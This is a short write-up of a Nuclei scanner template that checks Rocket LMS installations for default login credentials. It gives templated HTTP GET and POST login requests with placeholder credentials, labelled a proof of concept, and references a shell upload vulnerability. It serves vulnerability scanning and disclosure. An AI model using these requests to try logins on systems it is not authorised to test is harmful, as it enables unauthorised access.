# Nuclei Template: Rocket LMS - Default Login
**Template ID:** rocketlms-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`rocketlms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Rocket LMS default credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
GET /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/login

POST /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/login
Content-Type: application/x-www-form-urlencoded

_token={{token}}&type=email&email={{username}}&country_code=&mobile=&password={{password}}
```

## References
- https://codecanyon.net/item/rocket-lms-learning-management-academy-script/33120735
- https://github.com/Yucaerin/RocketLms
- https://medium.com/@naxtarrr/rocket-lms-shell-upload-vulnerability-c400665702f3
